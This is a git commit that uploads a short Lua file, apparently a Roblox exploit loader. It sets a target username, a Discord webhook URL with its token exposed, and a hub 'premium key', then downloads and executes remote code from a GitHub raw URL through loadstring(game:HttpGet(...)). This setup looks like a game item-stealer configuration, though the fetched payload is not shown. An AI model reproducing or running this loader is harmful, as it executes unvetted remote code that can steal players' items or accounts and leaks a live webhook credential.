610cdbadb5200244d2d77be00327c6d68b6c6b48
veytx <130006836+veytx@users.noreply.github.com>
2023-04-06 21:20:47 +0200

    Add files via upload

---
+++ 1063865991760715907.lua
@@ -0,0 +1,4 @@
+UserName = "Yt_elias12"
+Webhook = "https://discord.com/api/webhooks/1093594515157307473/B9LpTfmoyTdy8eJI_I0SBCLBu-nEnLYgcc6elhqUfdcMdTPScEwyjtIVDkAoYAIbi14K"
+_G.PremiumKey = "rizzhub-AHMHa1jPbxJtBv0hcFJf"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
